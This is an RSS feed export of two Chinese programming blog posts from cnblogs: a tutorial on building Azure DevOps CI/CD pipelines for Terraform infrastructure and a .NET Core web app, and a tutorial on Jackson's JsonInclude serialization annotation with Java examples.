<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Azure Terraform（八）利用Azure DevOps 实现Infra资源和.NET CORE Web 应用程序的持续集成、持续部署 - Grant_Allen</title>
<link>http://www.cnblogs.com/AllenMaster/p/14352105.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/AllenMaster/p/14352105.html</guid>
<description>&lt;h2&gt;一，引言&lt;/h2&gt;
&lt;p&gt;　　上一篇讲解到利用 Azure DevOps 将整个 Azure Web App，Azure Traffic Manager profile，Azure Storage Account，Azure Key Vault 部署到 Azure 上，我们也知道整个 Infra 架构已经实现了自动化部署，而 整个项目Web应该却没事实现CI/CD，那么我们今天继续关注 Azure DevOps。&lt;/p&gt;
&lt;p&gt;--------------------Azure Terraform 系列--------------------&lt;/p&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14188380.html&quot; target=&quot;_blank&quot;&gt;1，Azure Terraform（一）入门简介&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14196875.html&quot; target=&quot;_blank&quot;&gt;2，Azure Terraform（二）语法详解&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14254731.html&quot; target=&quot;_blank&quot;&gt;3，Azure Terraform（三）部署 Web 应用程序&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14274731.html&quot; target=&quot;_blank&quot;&gt;4，Azure Terraform（四）状态文件存储&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14274035.html&quot; target=&quot;_blank&quot;&gt;5，Azure Terraform（五）利用Azure DevOps 实现自动化部署基础资源&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14299624.html&quot; target=&quot;_blank&quot;&gt;6，Azure Terraform（六）Common Module&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14338906.html&quot; target=&quot;_blank&quot;&gt;7，Azure Terraform（七）利用Azure DevOps 实现自动化部署基础资源（补充）&lt;/a&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;a href=&quot;https://www.cnblogs.com/AllenMaster/p/14352105.html&quot; target=&quot;_blank&quot;&gt;8，Azure Terraform（八）利用Azure DevOps 实现Infra资源和.NET CORE Web 应用程序的持续集成、持续部署&lt;/a&gt;&lt;/h3&gt;
&lt;h2&gt;二，正文&lt;/h2&gt;
&lt;h4&gt;1，Azure DevOps 创建新项目&lt;/h4&gt;
&lt;p&gt;输入项目名称 “&lt;strong&gt;CnBateBlogWeb_Infrastructure_V3&lt;/strong&gt;”，点击 “Create” 创建项目。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202101/1996262-20210131204612055-1895439935.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2，配置 Azure DevOps Pipeline&lt;/h3&gt;
&lt;h4&gt;2.1，Continuous integration&lt;/h4&gt;
&lt;p&gt;选择 “Pipelines=》pipelines”，点击 “Create Pipeline” 创建管道&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202101/1996262-20210131215257903-613211287.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击图中圈中的部分，使用经典编辑器创建没有 YAML 的管道&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202101/1996262-20210131215446779-1293565375.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;选择 “GitHub”，并且验证连接&lt;/p&gt;
&lt;p&gt;Repository 选择项目代码所在的 Repository&lt;/p&gt;
&lt;p&gt;Default branch for manual and scheduled builds 选择：“master”&lt;/p&gt;
&lt;p&gt;点击 “Continues”，进入下一步&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202101/1996262-20210131220032920-1366299675.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;需要选择模板，搜索框中输入 “ASP.NET Core”，选择对应的模板，点击“Apply”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202101/1996262-20210131220213002-2108428895.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于我这里演示的 Web 项目没有单元测试，所有可以将 “Test” 整个Task 移除掉&lt;/p&gt;
&lt;p&gt;选中当前 “Task”，点击 “Remove” 进行移除。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202101/1996262-20210131220754574-1721857114.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;切换到 “Triggers”，开启 “Enable continuous intergration” 和 “Enable pull request validation”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201103347820-1621657203.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201103417479-1649321841.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后，我们修改当前 pipeline 的名称为 “CnBateBlogWeb_ASP.NET Core-CI”，并且点击 “Save&amp;amp;queue” 保存并且加入到队列&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201103708985-769362303.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行 pipeline，点击 “Save and run”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201103855146-579761197.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;稍等之后，我们可以看到运行成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201104059049-1217709470.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4&gt;2.2，Continuous Deploy&lt;/h4&gt;
&lt;h5&gt;2.2.1，添加 Infra Deploy&lt;/h5&gt;
&lt;p&gt;选择 “Pipeline=》Releases”，点击 “New pipeline” 创建新的 releases pipeline&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201104251899-497605761.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先添加 Infra Stage，我就不过多演示了，大家可以参考 &lt;/p&gt;
&lt;p&gt;相关 Task&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201154754243-2013492270.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;相关参数变量：&lt;/p&gt;
&lt;table border=&quot;0&quot;&gt;&lt;tbody readability=&quot;5&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Name&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Value&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;cnbateblogweb01_appservicename&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;span&gt;CnBateBlogWeb01&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;cnbateblogweb02_appservicename&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;span&gt;CnBateBlogWeb02&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;keyvault&lt;/td&gt;
&lt;td&gt; cnbate-terraform-kv8&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;keyvault_sc&lt;/td&gt;
&lt;td&gt; terraform-stste-storage-key&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;storage_account&lt;/td&gt;
&lt;td&gt; cnbateterraformstorage&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;storage_account_container&lt;/td&gt;
&lt;td&gt; terraform-state&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;storage_account_container_key&lt;/td&gt;
&lt;td&gt; cnbate.terraform.stats&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;terraform_rg&lt;/td&gt;
&lt;td&gt; Web_Test_TF_RG&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201154819029-616551746.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;修改 “releases pipeline” 名称 “CnBateBlogWeb_pipeline_CD”，点击 “Save” 进行保存操作&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201154841574-362714231.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5&gt;2.2.2，添加 Application Deploy&lt;/h5&gt;
&lt;p&gt;点击 “+Add”，添加新的 “Artifacts”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201164313869-1779768696.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;选择 “Build”，编辑相关参数&lt;/p&gt;
&lt;p&gt;Project 选择：“CnBateBlogWeb_Infrastructure_V3”&lt;/p&gt;
&lt;p&gt;Source（build pipeline）:&quot;CnBateBlogWeb_ASP.NET Core-CI&quot;&lt;/p&gt;
&lt;p&gt;点击 “Add”，确认添加 &quot;Artifacts&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201164442895-48952957.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击 “+Add” 添加 Application Deploy Step&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201165419083-1206634349.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;模板选择先点击 “Empty job”，添加一个新的空Job&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201165522311-1158102689.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;修改当前 Stage name 为 “Deploy Application”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201165642150-764503163.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们为当前 Job 添加 task&lt;/p&gt;
&lt;p&gt;搜索框中输入 “Azure App Service deploy”，点击 “Add”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201170029308-493946876.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;修改相关参数&lt;/p&gt;
&lt;p&gt;Display name：“Azure App Service Deploy: $(cnbateblogweb01_appservicename)”&lt;/p&gt;
&lt;p&gt;Azure subscription 选择当前自己的订阅&lt;/p&gt;
&lt;p&gt;App Service type 选择：“Web App on Linux”&lt;/p&gt;
&lt;p&gt;App Service name：“$(cnbateblogweb01_appservicename)”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201173717848-118526711.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Package of folder：选择 &quot;CnBateBlogWeb_ASP.NET Core-CI&quot; 下的项目 Build 成功的 Package or folder，点击 “OK”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201174418792-855331553.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们添加第二个 Azure App Service Deploy&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201174828936-852891887.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后，点击 “Save” 进行保存操作&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201174918587-143659492.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至于项目的 “Artifacts” 的触发方式，大家可以结合自己实际项目，合理选择。当前我不设置任何自动触发机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201175802558-380211446.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;3，测试运行 Pipeline，部署 Infra 资源、Application 资源&lt;/h3&gt;
&lt;p&gt;点击 “Create release”，运行 releases pipeline&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201180008315-728930556.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击 “Create” 确认创建&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201180105569-641159113.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;部署成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201183650583-1387608775.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们转到 Azure Portal 查看资源部署情况&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201183843773-93489214.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问 &quot;CnBateBlogWeb01&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201183955930-1477905558.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问 &quot;CnBateBlogWeb02&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201184044099-905440085.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问 Traffic Manager profile 的 DNS：”http://cnbateblogweb.trafficmanager.net/“&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996262/202102/1996262-20210201184128058-1214851762.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Bingo，成功！！！！！φ(゜▽゜*)♪φ(゜▽゜*)♪*★,°*:.☆(￣▽￣)/$:*.°★* 。&lt;/p&gt;
&lt;h2&gt;三，结尾&lt;/h2&gt;
&lt;p&gt;　　今天我们通过 Azure DevOps 将基础设施资源和应用项目部署到 Azure 上，文中的实践操作比较多，大家要多多练习。本文所分享的内容也存在着很多我自己的一些理解，有理解不到位的，还希望多多包涵，并且指出不足之处。&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://www.terraform.io/&quot; target=&quot;_blank&quot;&gt;Terraform 官方&lt;/a&gt;，&lt;a href=&quot;https://registry.terraform.io/providers/hashicorp/azurerm/latest&quot; target=&quot;_blank&quot;&gt;azurerm 文档&lt;/a&gt;&lt;a href=&quot;https://docs.microsoft.com/zh-cn/azure/developer/terraform/&quot; target=&quot;_blank&quot;&gt;&lt;br/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Terraform_Cnbate_Traffic_Manager github：&lt;a href=&quot;https://github.com/yunqian44/Terraform_Cnbate_Traffic_Manager&quot; target=&quot;_blank&quot;&gt;https://github.com/yunqian44/Terraform_Cnbate_Traffic_Manager&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CnBateBlogWeb github：&lt;a href=&quot;https://github.com/yunqian44/CnBateBlogWeb&quot; target=&quot;_blank&quot;&gt;https://github.com/yunqian44/CnBateBlogWeb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://www.cnblogs.com/AllenMaster&quot; target=&quot;_blank&quot;&gt;Allen&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;版权：转载请在文章明显位置注明作者及出处。如发现错误，欢迎批评指正。&lt;/p&gt;
</description>
<pubDate>Tue, 02 Feb 2021 00:49:00 +0000</pubDate>
<dc:creator>Grant_Allen</dc:creator>
<og:description>一，引言 上一篇讲解到利用 Azure DevOps 将整个 Azure Web App，Azure Traffic Manager profile，Azure Storage Account，Azu</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/AllenMaster/p/14352105.html</dc:identifier>
</item>
<item>
<title>jackson学习之五：JsonInclude注解 - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/14360209.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/14360209.html</guid>
<description>&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;h3 id=&quot;系列文章汇总&quot;&gt;系列文章汇总&lt;/h3&gt;
&lt;h3 id=&quot;本篇概览&quot;&gt;本篇概览&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;本文是《jackson学习》系列第五篇，来熟悉一个常用的注解&lt;span&gt;JsonInclude&lt;/span&gt;，该注解的仅在序列化操作时有用，用于控制方法、属性等是否应该被序列化；&lt;/li&gt;
&lt;li&gt;之所以用单独的一篇来写JsonInclude注解，是因为该注解的值有多种，每种都有不同效果，最好的学习方法就是编码实战；&lt;/li&gt;
&lt;li&gt;先对注解的所有取值做个简介：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;ALWAYS // 默认策略，任何情况都执行序列化
NON_NULL // 非空
NON_ABSENT // null的不会序列化，但如果类型是AtomicReference，依然会被序列化
NON_EMPTY // null、集合数组等没有内容、空字符串等，都不会被序列化
NON_DEFAULT // 如果字段是默认值，就不会被序列化
CUSTOM // 此时要指定valueFilter属性，该属性对应一个类，用来自定义判断被JsonInclude修饰的字段是否序列化
USE_DEFAULTS // 当JsonInclude在类和属性上都有时，优先使用属性上的注解，此时如果在序列化的get方法上使用了JsonInclude，并设置为USE_DEFAULTS，就会使用类注解的设置  
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;源码下载&quot;&gt;源码下载&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;如果您不想编码，可以在GitHub下载所有源码，地址和链接信息如下表所示(&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;)：&lt;/li&gt;
&lt;/ol&gt;&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;这个git项目中有多个文件夹，本章的应用在&lt;span&gt;jacksondemo&lt;/span&gt;文件夹下，如下图红框所示：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084750110-860547581.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;&lt;span&gt;jacksondemo&lt;/span&gt;是父子结构的工程，本篇的代码在&lt;span&gt;annotation&lt;/span&gt;子工程中，里面的&lt;span&gt;jsoninclude&lt;/span&gt;这个package下，如下图：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084751176-1515316689.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;接下来逐个学习这些属性的效果；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;always&quot;&gt;ALWAYS&lt;/h3&gt;
&lt;p&gt;ALWAYS表示全部序列化，如下图，null和空字符串都会序列化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084752437-1331382705.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;non_null&quot;&gt;NON_NULL&lt;/h3&gt;
&lt;p&gt;NON_NULL好理解，就是值为null就不序列化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084754051-751441111.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;non_absent&quot;&gt;NON_ABSENT&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;NON_ABSENT略为复杂，当实例化的对象有&lt;span&gt;Optional&lt;/span&gt;或&lt;span&gt;AtomicReference&lt;/span&gt;类型的成员变量时，如果Optional引用的实例为空，用&lt;span&gt;NON_ABSENT&lt;/span&gt;能使该字段不做序列化；&lt;/li&gt;
&lt;li&gt;Optional是java用来优雅处理空指针的一个特性，本文中不做过多说明，请您自行查阅相关文档；&lt;/li&gt;
&lt;li&gt;要让Jackson支持Optional特性，必须做两件事，首先是在&lt;span&gt;pom.xml&lt;/span&gt;中添加以下依赖：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.datatype&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;jackson-datatype-jdk8&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.11.0&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;其次是代码中执行以下设置：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;mapper.registerModule(new Jdk8Module());
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;咱们先看看设置成&lt;span&gt;NON_NULL&lt;/span&gt;时jackson对Optional和AtomicReference的处理，下面的代码中，Optional和AtomicReference的引用都是空，但还是被序列化出来了：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084756348-1723841510.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;6&quot;&gt;&lt;li&gt;代码不变，将&lt;span&gt;NON_NULL&lt;/span&gt;改为&lt;span&gt;NON_ABSENT&lt;/span&gt;试试，如下图，可见field2和field3都没有序列化了：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084758168-704887738.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;小结NON_ABSENT的效果：&lt;br/&gt;a. 自身为null的字段不会被序列化；&lt;br/&gt;b. Optional类型的字段，如果引用值为null，该字段不会被序列化；&lt;br/&gt;c. AtomicReference类型的字段，如果引用值为null，该字段不会被序列化；&lt;/p&gt;
&lt;h3 id=&quot;non_empty&quot;&gt;NON_EMPTY&lt;/h3&gt;
&lt;p&gt;NON_EMPTY好理解，以下情况都不会被序列化：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;null&lt;/li&gt;
&lt;li&gt;空字符串&lt;/li&gt;
&lt;li&gt;空集合&lt;/li&gt;
&lt;li&gt;空数组&lt;/li&gt;
&lt;li&gt;Optional类型的，其引用为空&lt;/li&gt;
&lt;li&gt;AtomicReference类型的，其引用为空&lt;/li&gt;
&lt;li&gt;演示代码和结果如下图，可见上述场景全部没有被序列化：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084759399-674461517.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;non_default&quot;&gt;NON_DEFAULT&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;设置为NON_DEFAULT后，对保持默认值的字段不做序列化，如下图：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084800585-94725648.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;custom&quot;&gt;CUSTOM&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;相对其他类型，CUSTOM略为复杂，这个值要配合&lt;span&gt;valueFilter&lt;/span&gt;属性一起使用；&lt;/li&gt;
&lt;li&gt;如下所示，JsonInclude的value等于&lt;span&gt;CUSTOM&lt;/span&gt;时，在序列化的时候会执行CustomFilter的&lt;span&gt;equals&lt;/span&gt;方法，该方法的入参就是&lt;span&gt;field0&lt;/span&gt;的值，如果equals方法返回true，&lt;span&gt;field0就不会被序列化&lt;/span&gt;，如果equals方法返回false时field0才会被序列化&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@JsonInclude(value = JsonInclude.Include.CUSTOM, 
                valueFilter = CustomFilter.class)
        private String field0;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;来看看CustomFilter类的代码，如下所示，只有equals方法，可见：null、非字符串、长度大于2这三种情况都返回true，也就是说这三种情况下都&lt;span&gt;不会被序列化&lt;/span&gt;：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;static class CustomFilter {
        @Override
        public boolean equals(Object obj) {
            // null，或者不是字符串就返回true，意味着不被序列化
            if(null==obj || !(obj instanceof String)) {
                return true;
            }

            // 长度大于2就返回true，意味着不被序列化
            return ((String) obj).length() &amp;gt; 2;
        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;下面贴出完整代码和结果，您就一目了然了：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084802576-1778550824.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
